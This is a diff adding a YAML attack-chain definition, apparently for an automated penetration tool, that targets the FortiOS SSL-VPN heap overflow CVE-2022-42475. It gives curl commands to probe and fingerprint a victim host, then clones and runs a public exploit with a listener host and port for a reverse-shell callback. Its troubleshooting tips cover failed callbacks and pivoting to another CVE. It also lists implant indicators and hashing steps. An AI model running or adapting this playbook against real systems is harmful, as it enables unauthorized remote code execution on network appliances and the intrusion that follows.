@@ -1,0 +1,72 @@
+chain_id: fortios_cve_2022_42475
+title: "Fortinet FortiOS SSL-VPN — CVE-2022-42475 unauth heap overflow → RCE"
+severity: CRITICAL
+tags: [web, fortinet, fortios, ssl-vpn, cve-2022-42475, heap-overflow, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2022-42475" }
+    - { banner_pattern: "(?i)fortigate|fortinet|fortios|forticlient" }
+    - { product_pattern: "(?i)fortios|fortigate" }
+    - { path_pattern: "(?i)/remote/(login|fgt_lang|logincheck)" }
+
+description: |
+  FortiOS SSL-VPN 7.2.0–7.2.2, 7.0.0–7.0.8, 6.4.0–6.4.10, 6.2.0–6.2.11,
+  6.0.0–6.0.15, 5.6.0–5.6.14, 5.4.0–5.4.13, 5.2.0–5.2.15, 5.0.0–5.0.14
+  has a heap buffer overflow in `sslvpnd` reachable pre-auth via a
+  crafted POST. Successful exploitation drops shellcode that pulls a
+  second-stage from a Fortinet-spoofed C2. Tied to chinese-state actor
+  exploitation (BOLDMOVE).
+
+steps:
+  - id: 1
+    title: "Confirm SSL-VPN is exposed"
+    command: |
+      curl -sk -i "https://$VICTIMA:10443/remote/login" | head -20
+      curl -sk -i "https://$VICTIMA:10443/remote/fgt_lang?lang=en"
+
+  - id: 2
+    title: "Fingerprint version (response file paths leak build)"
+    command: |
+      curl -sk "https://$VICTIMA:10443/remote/login?lang=en" \
+        | grep -Eo 'lang=[a-z_]+\\.json\\?[0-9]+' | sort -u
+
+  - id: 3
+    title: "Public PoCs (heap shaping + rop, not a one-liner)"
+    command: |
+      git clone https://github.com/BishopFox/CVE-2022-42475 /tmp/fortios
+      python3 /tmp/fortios/exploit.py --target https://$VICTIMA:10443 \
+        --lhost 10.0.2.15 --lport 4444
+
+  - id: 4
+    title: "Hunt for in-the-wild IoCs once you have shell"
+    command: |
+      # On the FortiGate via the (limited) CLI:
+      diagnose sys file ls /data/lib/libips.bak
+      diagnose sys file ls /data/lib/libgif.so
+      # Fortinet's IoC list says these binaries are dropped by the implant.
+
+  - id: 5
+    title: "Persistence Fortinet documented"
+    command: |
+      # Implant patches:
+      #   /sbin/init  →  to mount tmpfs over /data/etc on boot
+      #   /data/lib/libips.bak  →  staging
+      # If you find these, the box was already owned. Hash them:
+      sha256sum /data/lib/libips.bak /data/lib/libgif.so 2>/dev/null
+
+common_errors:
+  - error: "404 on /remote/login"
+    solution: |
+      SSL-VPN portal disabled or moved. Check 4443/8443. If portal
+      truly off, this CVE does not apply — pivot to FortiManager/
+      FortiAnalyzer CVE-2024-23113 instead.
+  - error: "Crash but no callback"
+    solution: |
+      Heap layout differs between 7.0.x and 7.2.x. The BishopFox PoC
+      ships per-version offsets — pass `--version 7.0.6` etc.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2022-42475
+  - https://www.fortiguard.com/psirt/FG-IR-22-398
+  - https://bishopfox.com/blog/fortinet-cve-2022-42475-analysis
